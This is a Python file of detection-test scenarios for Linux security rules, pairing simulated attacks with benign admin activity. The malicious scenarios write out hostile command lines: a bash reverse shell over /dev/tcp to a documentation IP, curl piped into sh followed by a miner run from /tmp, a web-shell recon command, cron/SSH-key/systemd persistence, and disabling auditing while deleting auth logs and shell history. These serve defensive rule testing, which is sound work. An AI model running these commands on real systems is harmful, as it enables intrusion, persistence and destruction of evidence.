"""Corpus scenarios for the Linux rules: each attack beside the ordinary activity that resembles it."""

from __future__ import annotations

from .lab import BENIGN, MALICIOUS, Scenario
from .replay import StreamBuilder

BASH = "/usr/bin/bash"
SH = "/usr/bin/dash"
SSHD = "/usr/sbin/sshd"
NGINX = "/usr/sbin/nginx"
PHP = "/usr/sbin/php-fpm"
VIM = "/usr/bin/vim"
DPKG = "/usr/bin/dpkg"


def _builder() -> StreamBuilder:
    return StreamBuilder(host="pi-lab")


def _reverse_shell() -> Scenario:
    b = _builder()
    b.process_create("S", BASH, parent_guid="D", parent_image=SSHD)
    b.process_create("R", BASH, parent_guid="S", parent_image=BASH,
                     command_line="bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'")
    return Scenario("linux_reverse_shell", MALICIOUS, b.events,
                    expected_rules=frozenset({"linux.exec.remote_shell"}), technique_ids=("T1059.004",),
                    description="bash wired to a TCP socket: a reverse shell.")


def _pipe_to_shell_from_tmp() -> Scenario:
    b = _builder()
    b.process_create("S", SH, parent_guid="B", parent_image=BASH,
                     command_line="sh -c 'curl -fsSL http://198.51.100.7/i.sh | sh'")
    b.process_create("X", "/tmp/.x/miner", parent_guid="S", parent_image=SH, command_line="/tmp/.x/miner -o pool")
    return Scenario("linux_download_and_run", MALICIOUS, b.events,
                    expected_rules=frozenset({"linux.exec.remote_shell", "linux.exec.from_tmp"}),
                    technique_ids=("T1105", "T1059.004"),
                    description="curl piped into sh, then a binary run from a hidden folder in /tmp.")


def _web_shell() -> Scenario:
    b = _builder()
    b.process_create("S", SH, parent_guid="P", parent_image=PHP, command_line="sh -c 'id; uname -a'")
    return Scenario("linux_web_shell", MALICIOUS, b.events,
                    expected_rules=frozenset({"linux.exec.web_server_shell"}), technique_ids=("T1505.003",),
                    description="php-fpm spawns a shell that runs reconnaissance commands.")


def _cron_and_key_persistence() -> Scenario:
    b = _builder()
    b.process_create("S", BASH, parent_guid="D", parent_image=SSHD)
    b.file_write("S", "/etc/cron.d/sysupdate", image=BASH)
    b.file_write("S", "/root/.ssh/authorized_keys", image=BASH)
    b.file_write("S", "/etc/systemd/system/sysupdate.service", image=BASH)
    return Scenario("linux_persistence", MALICIOUS, b.events,
                    expected_rules=frozenset({"linux.persist.startup_location"}),
                    technique_ids=("T1053.003", "T1098.004", "T1543.002"),
                    description="A shell writes a cron job, an SSH key and a systemd unit.")


def _logs_and_audit_disabled() -> Scenario:
    b = _builder()
    b.process_create("A", "/usr/sbin/auditctl", parent_guid="S", parent_image=BASH, command_line="auditctl -e 0")
    b.process_create("R", "/usr/bin/rm", parent_guid="S", parent_image=BASH,
                     command_line="rm -f /var/log/auth.log /root/.bash_history")
    return Scenario("linux_defense_tamper", MALICIOUS, b.events,
                    expected_rules=frozenset({"linux.defense.tamper"}), technique_ids=("T1562.001", "T1070.002"),
                    description="Auditing switched off, then the auth log and shell history deleted.")


def _admin_session() -> Scenario:
    b = _builder()
    b.process_create("S", BASH, parent_guid="D", parent_image=SSHD)
    b.process_create("C", "/usr/bin/curl", parent_guid="S", parent_image=BASH,
                     command_line="curl -fsSL https://example.org/install.sh -o install.sh")
    b.process_create("L", "/usr/bin/less", parent_guid="S", parent_image=BASH, command_line="less install.sh")
    b.process_create("N", "/usr/bin/nc", parent_guid="S", parent_image=BASH, command_line="nc -zv 10.0.0.5 22")
    b.process_create("J", "/usr/bin/journalctl", parent_guid="S", parent_image=BASH, command_line="journalctl -u ssh -n 50")
    b.process_create("U", "/usr/sbin/ufw", parent_guid="S", parent_image=BASH, command_line="ufw status verbose")
    b.network_connect("C", "93.184.216.34", 443, image="/usr/bin/curl")
    return Scenario("linux_admin_session", BENIGN, b.events,
                    description="An admin over SSH downloads a script to read it, tests a port, reads logs.")


def _package_upgrade() -> Scenario:
    b = _builder()
    b.process_create("P", DPKG, parent_guid="A", parent_image="/usr/bin/apt-get", command_line="dpkg --configure -a")
    b.file_write("P", "/usr/lib/systemd/system/nginx.service", image=DPKG)
    b.file_write("P", "/etc/cron.d/certbot", image=DPKG)
    b.process_create("T", "/usr/bin/systemctl", parent_guid="P", parent_image=DPKG, command_line="systemctl restart nginx")
    return Scenario("linux_package_upgrade", BENIGN, b.events,
                    description="A package upgrade installs a systemd unit and a cron job, then restarts a service.")


def _web_server_normal() -> Scenario:
    b = _builder()
    b.process_create("W", NGINX, parent_guid="1", parent_image="/usr/lib/systemd/systemd",
                     command_line="nginx -g 'daemon on;'")
    b.process_create("K", NGINX, parent_guid="W", parent_image=NGINX, command_line="nginx: worker process")
    b.network_connect("K", "10.0.0.9", 8080, image=NGINX)
    b.process_create("S", SH, parent_guid="C", parent_image="/usr/sbin/cron",
                     command_line="sh -c 'logrotate /etc/logrotate.conf'")
    return Scenario("linux_web_server_normal", BENIGN, b.events,
                    description="nginx starts workers and proxies to a backend; cron runs logrotate through a shell.")


def _user_edits_own_config() -> Scenario:
    b = _builder()
    b.process_create("V", VIM, parent_guid="S", parent_image=BASH, command_line="vim /home/sam/notes.txt")
    b.file_write("V", "/home/sam/notes.txt", image=VIM)
    b.file_write("V", "/home/sam/.config/app/settings.json", image=VIM)
    b.process_create("G", "/usr/bin/git", parent_guid="S", parent_image=BASH, command_line="git commit -m 'history -c fix'")
    return Scenario("linux_user_edits", BENIGN, b.events,
                    description="Editing ordinary files; a commit message that happens to mention 'history'.")


def linux_corpus() -> list[Scenario]:
    return [
        _reverse_shell(), _pipe_to_shell_from_tmp(), _web_shell(), _cron_and_key_persistence(),
        _logs_and_audit_disabled(),
        _admin_session(), _package_upgrade(), _web_server_normal(), _user_edits_own_config(),
    ]
